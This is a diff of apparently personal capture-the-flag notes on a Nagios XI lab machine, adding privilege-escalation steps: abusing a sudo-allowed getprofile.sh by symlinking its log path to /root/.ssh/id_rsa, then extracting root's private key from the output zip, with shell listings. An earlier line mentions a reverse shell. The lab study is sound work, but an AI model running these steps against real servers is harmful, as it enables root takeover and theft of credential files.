@@ -126,9 +126,26 @@ inner network email phishing
 12. manually create commands in "Core Config Manager", which is a reverse shell. goto localhost -> run this command.
     (same as execute_cmdstager() in https://www.exploit-db.com/exploits/44969, check how it works later.)
 13. get user "nagios"
-14. 
-
-
+14. sudo -l, find it can execute getprofile.sh, which contains vuln as
+	if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
+	 tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > 
+	"/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
+	fi
+15. ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
+    (let the previous command, read from root id_rsa)
+	    /usr/local/nagiosxi/tmp$ ls -la
+	ls -la
+	total 12
+	drwsrwsr-x  3 www-data nagios 4096 Dec 16 19:34 .
+	drwxr-xr-x 10 root     nagios 4096 Nov  9  2023 ..
+	drwxr-sr-x  2 root     nagios 4096 Nov 10  2023 migrate
+	lrwxrwxrwx  1 nagios   nagios   17 Dec 16 19:34 phpmailer.log -> /root/.ssh/id_rsa
+16. run: sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
+17. Get root private key.
+	cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
+	cd /tmp
+	unzip profile.zip
+	cat profile-<ID>/phpmailer.log 
 ```
 
 ## HTB: Manager 16 Mar 2024
